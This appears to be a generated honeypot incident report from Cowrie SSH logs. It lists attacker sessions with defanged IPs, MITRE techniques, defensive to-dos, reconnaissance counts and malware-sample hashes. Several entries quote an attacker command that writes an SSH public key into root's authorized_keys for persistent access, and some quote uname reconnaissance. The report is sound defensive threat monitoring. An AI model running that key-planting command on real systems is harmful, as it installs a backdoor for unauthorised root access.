### 🔴 HIGH · IR-c21409160dfa

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]68` |
| **First Seen** | 2026-08-10 16:30 |
| **Last Seen** | 2026-08-10 16:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:30:14` | `cowrie.session.connect` |
| `2026-08-10 16:30:14` | `cowrie.client.version` |
| `2026-08-10 16:30:14` | `cowrie.client.kex` |
| `2026-08-10 16:30:14` | `cowrie.login.success` |
| `2026-08-10 16:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]68` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbee58e9ed66

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]68` |
| **First Seen** | 2026-08-10 16:30 |
| **Last Seen** | 2026-08-10 16:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:30:14` | `cowrie.session.connect` |
| `2026-08-10 16:30:14` | `cowrie.client.version` |
| `2026-08-10 16:30:14` | `cowrie.client.kex` |
| `2026-08-10 16:30:14` | `cowrie.login.success` |
| `2026-08-10 16:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]68` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf5c84ab572c

| Field | Detail |
|---|---|
| **Source IP** | `185.148.129[.]112` |
| **First Seen** | 2026-08-10 16:38 |
| **Last Seen** | 2026-08-10 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:38:20` | `cowrie.session.connect` |
| `2026-08-10 16:38:20` | `cowrie.client.version` |
| `2026-08-10 16:38:20` | `cowrie.client.kex` |
| `2026-08-10 16:38:20` | `cowrie.login.success` |
| `2026-08-10 16:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.148.129[.]112` to AbuseIPDB if not already reported
- [ ] Block `185.148.129[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34fb9f8c8044

| Field | Detail |
|---|---|
| **Source IP** | `193.151.151[.]92` |
| **First Seen** | 2026-08-10 16:38 |
| **Last Seen** | 2026-08-10 16:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:38:20` | `cowrie.session.connect` |
| `2026-08-10 16:38:21` | `cowrie.client.version` |
| `2026-08-10 16:38:21` | `cowrie.client.kex` |
| `2026-08-10 16:38:22` | `cowrie.login.success` |
| `2026-08-10 16:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.151.151[.]92` to AbuseIPDB if not already reported
- [ ] Block `193.151.151[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a3147931d4

| Field | Detail |
|---|---|
| **Source IP** | `185.148.129[.]112` |
| **First Seen** | 2026-08-10 16:38 |
| **Last Seen** | 2026-08-10 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:38:20` | `cowrie.session.connect` |
| `2026-08-10 16:38:20` | `cowrie.client.version` |
| `2026-08-10 16:38:20` | `cowrie.client.kex` |
| `2026-08-10 16:38:20` | `cowrie.login.success` |
| `2026-08-10 16:38:21` | `cowrie.session.params` |
| `2026-08-10 16:38:21` | `cowrie.command.input` |
| `2026-08-10 16:38:21` | `cowrie.log.closed` |
| `2026-08-10 16:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.148.129[.]112` to AbuseIPDB if not already reported
- [ ] Block `185.148.129[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c745e0d5cafb

| Field | Detail |
|---|---|
| **Source IP** | `185.148.129[.]112` |
| **First Seen** | 2026-08-10 16:38 |
| **Last Seen** | 2026-08-10 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYteFBiVVKhUucH8Jjuzlh9pNriiQJFagSbuI1FN5czogKvtyc/ayDvt2T7w5UMuo1kIYefBQRKc661934f6dd2a58NAIs7ehhoG56IVFPUdooUza00ziduX/8vgd29UmSZk8Y+7bAh0cP43C3N0/M6RlV8Qy2onqrF02RbeTu9tzhuBBJA//7ZHzoL/0dbGhwrGOrxSmqPnNO4VL/W8gOHYyDRSLPfUpTJNsP9AulmmQeaYXcQOZ4pFzMpiGZwSXJYw9xcrz7PMmMAcCOYbAWJYz9LT980nY3XgQb9QSKDoGuRlqm5HPdY2bipGgFwgwNGG0V4bQLCUMKudkq6oWL rsa-key-20250409' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/author` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:38:21` | `cowrie.session.connect` |
| `2026-08-10 16:38:21` | `cowrie.client.version` |
| `2026-08-10 16:38:21` | `cowrie.client.kex` |
| `2026-08-10 16:38:22` | `cowrie.login.success` |
| `2026-08-10 16:38:22` | `cowrie.session.params` |
| `2026-08-10 16:38:22` | `cowrie.command.input` |
| `2026-08-10 16:38:22` | `cowrie.log.closed` |
| `2026-08-10 16:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.148.129[.]112` to AbuseIPDB if not already reported
- [ ] Block `185.148.129[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02dd8f3cfbb5

| Field | Detail |
|---|---|
| **Source IP** | `193.151.151[.]92` |
| **First Seen** | 2026-08-10 16:38 |
| **Last Seen** | 2026-08-10 16:43 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:38:23` | `cowrie.session.connect` |
| `2026-08-10 16:38:23` | `cowrie.client.version` |
| `2026-08-10 16:38:23` | `cowrie.client.kex` |
| `2026-08-10 16:38:25` | `cowrie.login.success` |
| `2026-08-10 16:41:53` | `cowrie.session.params` |
| `2026-08-10 16:41:53` | `cowrie.command.input` |
| `2026-08-10 16:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.151.151[.]92` to AbuseIPDB if not already reported
- [ ] Block `193.151.151[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b7a11113f5

| Field | Detail |
|---|---|
| **Source IP** | `172.245.181[.]192` |
| **First Seen** | 2026-08-10 16:38 |
| **Last Seen** | 2026-08-10 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:38:23` | `cowrie.session.connect` |
| `2026-08-10 16:38:23` | `cowrie.client.version` |
| `2026-08-10 16:38:23` | `cowrie.client.kex` |
| `2026-08-10 16:38:23` | `cowrie.login.success` |
| `2026-08-10 16:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.245.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.245.181[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b07af089d1c

| Field | Detail |
|---|---|
| **Source IP** | `172.245.181[.]192` |
| **First Seen** | 2026-08-10 16:38 |
| **Last Seen** | 2026-08-10 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:38:24` | `cowrie.session.connect` |
| `2026-08-10 16:38:24` | `cowrie.client.version` |
| `2026-08-10 16:38:24` | `cowrie.client.kex` |
| `2026-08-10 16:38:24` | `cowrie.login.success` |
| `2026-08-10 16:38:24` | `cowrie.session.params` |
| `2026-08-10 16:38:24` | `cowrie.command.input` |
| `2026-08-10 16:38:25` | `cowrie.log.closed` |
| `2026-08-10 16:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.245.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.245.181[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2930bba6b4ef

| Field | Detail |
|---|---|
| **Source IP** | `172.245.181[.]192` |
| **First Seen** | 2026-08-10 16:38 |
| **Last Seen** | 2026-08-10 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYteFBiVVKhUucH8Jjuzlh9pNriiQJFagSbuI1FN5czogKvtyc/ayDvt2T7w5UMuo1kIYefBQRKc661934f6dd2a58NAIs7ehhoG56IVFPUdooUza00ziduX/8vgd29UmSZk8Y+7bAh0cP43C3N0/M6RlV8Qy2onqrF02RbeTu9tzhuBBJA//7ZHzoL/0dbGhwrGOrxSmqPnNO4VL/W8gOHYyDRSLPfUpTJNsP9AulmmQeaYXcQOZ4pFzMpiGZwSXJYw9xcrz7PMmMAcCOYbAWJYz9LT980nY3XgQb9QSKDoGuRlqm5HPdY2bipGgFwgwNGG0V4bQLCUMKudkq6oWL rsa-key-20250409' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/author` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:38:25` | `cowrie.session.connect` |
| `2026-08-10 16:38:25` | `cowrie.client.version` |
| `2026-08-10 16:38:25` | `cowrie.client.kex` |
| `2026-08-10 16:38:25` | `cowrie.login.success` |
| `2026-08-10 16:38:26` | `cowrie.session.params` |
| `2026-08-10 16:38:26` | `cowrie.command.input` |
| `2026-08-10 16:38:26` | `cowrie.log.closed` |
| `2026-08-10 16:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.245.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.245.181[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a5272e08da

| Field | Detail |
|---|---|
| **Source IP** | `122.170.99[.]195` |
| **First Seen** | 2026-08-10 16:40 |
| **Last Seen** | 2026-08-10 16:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:40:47` | `cowrie.session.connect` |
| `2026-08-10 16:40:47` | `cowrie.client.version` |
| `2026-08-10 16:40:47` | `cowrie.client.kex` |
| `2026-08-10 16:40:49` | `cowrie.login.success` |
| `2026-08-10 16:40:49` | `cowrie.direct-tcpip.request` |
| `2026-08-10 16:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.99[.]195` to AbuseIPDB if not already reported
- [ ] Block `122.170.99[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adfe4cef756e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-08-10 16:40 |
| **Last Seen** | 2026-08-10 16:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:40:58` | `cowrie.session.connect` |
| `2026-08-10 16:40:59` | `cowrie.client.version` |
| `2026-08-10 16:40:59` | `cowrie.client.kex` |
| `2026-08-10 16:41:00` | `cowrie.login.success` |
| `2026-08-10 16:41:00` | `cowrie.direct-tcpip.request` |
| `2026-08-10 16:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544110f3650f

| Field | Detail |
|---|---|
| **Source IP** | `43.172.92[.]108` |
| **First Seen** | 2026-08-10 16:43 |
| **Last Seen** | 2026-08-10 16:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:43:51` | `cowrie.session.connect` |
| `2026-08-10 16:43:51` | `cowrie.client.version` |
| `2026-08-10 16:43:51` | `cowrie.client.kex` |
| `2026-08-10 16:43:51` | `cowrie.login.success` |
| `2026-08-10 16:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.172.92[.]108` to AbuseIPDB if not already reported
- [ ] Block `43.172.92[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2482b6f460

| Field | Detail |
|---|---|
| **Source IP** | `43.172.92[.]108` |
| **First Seen** | 2026-08-10 16:43 |
| **Last Seen** | 2026-08-10 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:43:51` | `cowrie.session.connect` |
| `2026-08-10 16:43:51` | `cowrie.client.version` |
| `2026-08-10 16:43:51` | `cowrie.client.kex` |
| `2026-08-10 16:43:52` | `cowrie.login.success` |
| `2026-08-10 16:43:52` | `cowrie.session.params` |
| `2026-08-10 16:43:52` | `cowrie.command.input` |
| `2026-08-10 16:43:53` | `cowrie.log.closed` |
| `2026-08-10 16:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.172.92[.]108` to AbuseIPDB if not already reported
- [ ] Block `43.172.92[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30a60904bff9

| Field | Detail |
|---|---|
| **Source IP** | `43.172.92[.]108` |
| **First Seen** | 2026-08-10 16:43 |
| **Last Seen** | 2026-08-10 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYteFBiVVKhUucH8Jjuzlh9pNriiQJFagSbuI1FN5czogKvtyc/ayDvt2T7w5UMuo1kIYefBQRKc661934f6dd2a58NAIs7ehhoG56IVFPUdooUza00ziduX/8vgd29UmSZk8Y+7bAh0cP43C3N0/M6RlV8Qy2onqrF02RbeTu9tzhuBBJA//7ZHzoL/0dbGhwrGOrxSmqPnNO4VL/W8gOHYyDRSLPfUpTJNsP9AulmmQeaYXcQOZ4pFzMpiGZwSXJYw9xcrz7PMmMAcCOYbAWJYz9LT980nY3XgQb9QSKDoGuRlqm5HPdY2bipGgFwgwNGG0V4bQLCUMKudkq6oWL rsa-key-20250409' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/author` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:43:53` | `cowrie.session.connect` |
| `2026-08-10 16:43:53` | `cowrie.client.version` |
| `2026-08-10 16:43:53` | `cowrie.client.kex` |
| `2026-08-10 16:43:53` | `cowrie.login.success` |
| `2026-08-10 16:43:53` | `cowrie.session.params` |
| `2026-08-10 16:43:53` | `cowrie.command.input` |
| `2026-08-10 16:43:54` | `cowrie.log.closed` |
| `2026-08-10 16:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.172.92[.]108` to AbuseIPDB if not already reported
- [ ] Block `43.172.92[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c212c7ce76c

| Field | Detail |
|---|---|
| **Source IP** | `193.151.151[.]92` |
| **First Seen** | 2026-08-10 16:44 |
| **Last Seen** | 2026-08-10 16:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYteFBiVVKhUucH8Jjuzlh9pNriiQJFagSbuI1FN5czogKvtyc/ayDvt2T7w5UMuo1kIYefBQRKc661934f6dd2a58NAIs7ehhoG56IVFPUdooUza00ziduX/8vgd29UmSZk8Y+7bAh0cP43C3N0/M6RlV8Qy2onqrF02RbeTu9tzhuBBJA//7ZHzoL/0dbGhwrGOrxSmqPnNO4VL/W8gOHYyDRSLPfUpTJNsP9AulmmQeaYXcQOZ4pFzMpiGZwSXJYw9xcrz7PMmMAcCOYbAWJYz9LT980nY3XgQb9QSKDoGuRlqm5HPdY2bipGgFwgwNGG0V4bQLCUMKudkq6oWL rsa-key-20250409' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/author` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:44:27` | `cowrie.session.connect` |
| `2026-08-10 16:44:27` | `cowrie.client.version` |
| `2026-08-10 16:44:27` | `cowrie.client.kex` |
| `2026-08-10 16:44:29` | `cowrie.login.success` |
| `2026-08-10 16:44:31` | `cowrie.session.params` |
| `2026-08-10 16:44:31` | `cowrie.command.input` |
| `2026-08-10 16:44:31` | `cowrie.log.closed` |
| `2026-08-10 16:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.151.151[.]92` to AbuseIPDB if not already reported
- [ ] Block `193.151.151[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-337bc32b5ad5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 16:50 |
| **Last Seen** | 2026-08-10 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:50:28` | `cowrie.session.connect` |
| `2026-08-10 16:50:28` | `cowrie.client.version` |
| `2026-08-10 16:50:28` | `cowrie.client.kex` |
| `2026-08-10 16:50:29` | `cowrie.login.success` |
| `2026-08-10 16:50:29` | `cowrie.direct-tcpip.request` |
| `2026-08-10 16:50:29` | `cowrie.direct-tcpip.data` |
| `2026-08-10 16:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e81ff60b7ac2

| Field | Detail |
|---|---|
| **Source IP** | `163.177.76[.]83` |
| **First Seen** | 2026-08-10 16:54 |
| **Last Seen** | 2026-08-10 16:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:54:41` | `cowrie.session.connect` |
| `2026-08-10 16:54:41` | `cowrie.client.version` |
| `2026-08-10 16:54:42` | `cowrie.client.kex` |
| `2026-08-10 16:54:42` | `cowrie.login.success` |
| `2026-08-10 16:54:43` | `cowrie.session.params` |
| `2026-08-10 16:54:43` | `cowrie.command.input` |
| `2026-08-10 16:54:44` | `cowrie.log.closed` |
| `2026-08-10 16:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.177.76[.]83` to AbuseIPDB if not already reported
- [ ] Block `163.177.76[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]142` | **40** | 2026-08-10 14:58 | 2026-08-10 16:50 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **36** | 2026-08-10 15:02 | 2026-08-10 16:54 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-10 15:02 | 2026-08-10 16:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **4** | 2026-08-10 14:58 | 2026-08-10 16:47 | 2m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **3** | 2026-08-10 16:07 | 2026-08-10 16:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-10 15:32 | 2026-08-10 15:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.175.246[.]102` | **3** | 2026-08-10 15:47 | 2026-08-10 15:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | **2** | 2026-08-10 16:03 | 2026-08-10 16:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `186.23.28[.]196` | **2** | 2026-08-10 16:40 | 2026-08-10 16:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `39.105.212[.]205` | **2** | 2026-08-10 15:32 | 2026-08-10 15:36 | 4m | 0 | `T1592` | 🟢 LOW |
| `46.150.65[.]132` | **2** | 2026-08-10 16:18 | 2026-08-10 16:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.236.54[.]176` | **2** | 2026-08-10 16:40 | 2026-08-10 16:48 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.242.104[.]81` | 1 | 2026-08-10 16:15 | 2026-08-10 16:16 | 39s | 0 | `T1592` | 🟢 LOW |
| `163.177.76[.]83` | 1 | 2026-08-10 16:54 | 2026-08-10 16:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.33.26[.]83` | 1 | 2026-08-10 15:31 | 2026-08-10 15:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.39.227[.]100` | 1 | 2026-08-10 15:34 | 2026-08-10 15:34 | 11s | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]85` | 1 | 2026-08-10 16:42 | 2026-08-10 16:42 | 15s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-08-10 16:10 | 2026-08-10 16:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.194.67[.]30` | 1 | 2026-08-10 16:46 | 2026-08-10 16:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]209` | 1 | 2026-08-10 16:22 | 2026-08-10 16:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]19` | 1 | 2026-08-10 15:18 | 2026-08-10 15:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.223.250[.]50` | 1 | 2026-08-10 15:52 | 2026-08-10 15:52 | 42s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]110` | 1 | 2026-08-10 16:03 | 2026-08-10 16:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-08-10 16:31 | 2026-08-10 16:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.239.108[.]218` | 1 | 2026-08-10 15:31 | 2026-08-10 15:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]35` | 1 | 2026-08-10 16:52 | 2026-08-10 16:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-10 15:12 | 2026-08-10 15:14 | 77s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-08-10 15:28 | 2026-08-10 15:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
